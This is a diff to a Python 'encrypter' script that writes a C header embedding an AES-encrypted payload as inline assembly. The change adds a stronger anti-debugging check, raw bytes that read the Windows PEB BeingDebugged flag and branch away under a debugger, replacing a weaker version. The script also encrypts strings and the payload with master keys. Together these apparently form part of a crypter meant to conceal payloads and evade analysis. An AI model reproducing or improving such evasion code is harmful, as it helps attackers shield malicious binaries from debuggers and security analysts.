@@ -23,8 +23,16 @@ def enc_obj(MasterKeyPayload, path: str):
     with open("macro_enc.h", "w") as f:
         f.write("/*\nFILE GENERATED AUTOMATICALLY VIA ENCRYPTER.py\nMANUAL EDITS WILL NOT AFFECT THE COMPILED FILE\n*/\n")
         f.write(f"\n#define payload_enc_asm  asm volatile(\ "[:-1]+"\n")
-        f.write(fr'".long 0x00fc8348\n\t"\ '[:-1] +"\n")
-        f.write(fr'".word 0x850f\n\t"\ '[:-1] +"\n")
+        # { 0x65, 0x48, 0x8B, 0x04,  0x25, 0x60, 0x00, 0x00,   0x00, 0x0F, 0xB6, 0x40,  0x02, 0x85, 0xC0, 0x0F,  0x85, 0x00, 0x00, 0x00, 0x00 } 
+        # check debugger
+        # below is poor version
+        # f.write(fr'".long 0x00fc8348\n\t"\ '[:-1] +"\n")
+        # f.write(fr'".word 0x850f\n\t"\ '[:-1] +"\n")
+        f.write(_asm(".long 0x048b4865"))
+        f.write(_asm(".long 0x00006025"))
+        f.write(_asm(".long 0x40b60f00"))
+        f.write(_asm(".long 0x0fc08502"))
+        f.write(_asm(".byte 0x84"))
         f.write(fr'".word 0x{asm_len}\n\t"\ '[:-1] +"\n")
         f.write(fr'".word 0x0000\n\t"\ '[:-1] +"\n")
         for s in strings:
@@ -38,7 +46,8 @@ def enc_obj(MasterKeyPayload, path: str):
     #             .replace("'", "").replace("[", "{").replace("]", "}")+";")
     return
 
-
+def _asm(s):
+    return fr'"{s} \n\t"\ '[:-1] + "\n"
 
 def enc_strings(chars, shorts, chars_data, shorts_data, MasterKeyStrings, MasterKeyPayload: str) -> None:
     cipher = AES.new(MasterKeyStrings, AES.MODE_ECB)
